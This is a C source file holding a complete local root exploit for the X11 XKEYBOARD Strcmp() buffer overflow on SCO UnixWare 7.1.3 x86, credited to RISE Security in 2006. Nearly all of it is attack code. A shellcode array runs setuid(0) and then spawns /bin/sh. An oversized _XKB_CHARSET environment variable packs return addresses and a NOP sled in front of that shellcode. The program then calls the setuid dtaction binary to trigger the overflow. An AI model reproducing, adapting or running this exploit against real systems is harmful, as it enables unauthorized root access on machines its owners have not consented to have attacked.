/*
 *  X11R6 XKEYBOARD extension Strcmp() for SCO UnixWare 7.1.3 x86
 *  Copyright 2006 RISE Security <contact@risesecurity.org>,
 *  Ramon de Carvalho Valle <ramon@risesecurity.org>
 *
 *  This program is free software; you can redistribute it and/or modify
 *  it under the terms of the GNU General Public License as published by
 *  the Free Software Foundation; either version 2 of the License, or
 *  (at your option) any later version.
 *
 *  This program is distributed in the hope that it will be useful,
 *  but WITHOUT ANY WARRANTY; without even the implied warranty of
 *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 *  GNU General Public License for more details.
 *
 *  You should have received a copy of the GNU General Public License
 *  along with this program; if not, write to the Free Software
 *  Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301  USA
 *
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define ADRSIZE 1024
#define NOPSIZE 4096

char shellcode[]=           /*  43 bytes                          */
    "\x68\xff\xf8\xff\x3c"  /*  pushl   $0x3cfff8ff               */
    "\x6a\x65"              /*  pushl   $0x65                     */
    "\x89\xe6"              /*  movl    %esp,%esi                 */
    "\xf7\x56\x04"          /*  notl    0x04(%esi)                */
    "\xf6\x16"              /*  notb    (%esi)                    */
    "\x31\xc0"              /*  xorl    %eax,%eax                 */
    "\x50"                  /*  pushl   %eax                      */
    "\xb0\x17"              /*  movb    $0x17,%al                 */
    "\xff\xd6"              /*  call    *%esi                     */
    "\x31\xc0"              /*  xorl    %eax,%eax                 */
    "\x50"                  /*  pushl   %eax                      */
    "\x68\x2f\x2f\x73\x68"  /*  pushl   $0x68732f2f               */
    "\x68\x2f\x62\x69\x6e"  /*  pushl   $0x6e69622f               */
    "\x89\xe3"              /*  movl    %esp,%ebx                 */
    "\x50"                  /*  pushl   %eax                      */
    "\x50"                  /*  pushl   %eax                      */
    "\x53"                  /*  pushl   %ebx                      */
    "\xb0\x3b"              /*  movb    $0x3b,%al                 */
    "\xff\xd6"              /*  call    *%esi                     */
;

int main(int argc,char **argv){
    char buf[8192],display[256],addr[4],*envp[4],*p;
    int i;

    printf("X11R6 XKEYBOARD extension Strcmp() for SCO UnixWare 7.1.3 x86\n");
    printf("Copyright 2006 RISE Security <contact@risesecurity.org>\n\n");

    if(argc!=2){
        fprintf(stderr,"usage: %s xserver:display\n",argv[0]);
        exit(EXIT_FAILURE);
    }

    snprintf(display,sizeof(display),"DISPLAY=%s",argv[1]);

    *((unsigned int *)addr)=(unsigned int)buf+2048+256+1024+2048+1;

    p=buf;
    sprintf(p,"_XKB_CHARSET=");
    p=buf+13;
    for(i=0;i<256;i++) *p++='A';
    for(i=0;i<ADRSIZE;i++) *p++=addr[i%4];
    for(i=0;i<NOPSIZE;i++) *p++='\x90';
    for(i=0;i<strlen(shellcode);i++) *p++=shellcode[i];
    *p='\0';

    envp[0]=buf;
    envp[1]=display;
    envp[2]=NULL;

    execle("/usr/dt/bin/dtaction","dtaction",0,envp);

    exit(EXIT_FAILURE);
}
